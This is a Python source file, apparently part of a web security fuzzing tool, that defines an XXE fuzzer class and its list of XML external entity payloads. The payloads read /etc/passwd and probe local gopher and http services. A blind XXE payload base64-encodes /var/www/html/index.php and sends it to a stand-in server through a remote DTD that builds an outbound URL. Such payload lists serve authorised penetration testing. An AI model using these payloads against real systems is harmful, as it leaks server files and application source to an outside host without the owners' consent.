#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_payloads = [
# test error version
'''<xml version="abc" ?>''',
'''<?xml version="1.0" ?>''',
# test read file
'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
%xxe;
]>''',
# test read file which not exists
'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwdxxx" >
%xxe;
]>''',
# test gopher protol
'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "gopher://localhost/" >
%xxe;
]>''',
# test http
'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://localhost/" >
%xxe;
]>''',
# blind xxe
'''<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % remote SYSTEM "http://server/evil.xml">
%remote;
%all;
]>
<root>&send;</root>'''
]
_serverPayloads= [
# blind xxe
'''<!ENTITY % all "<!ENTITY send SYSTEM 'http://serverip/?file=%file;'>">'''
]


class XXE(Fuzzer):

    @staticmethod
    def test():
        for payload in _payloads:
            yield payload
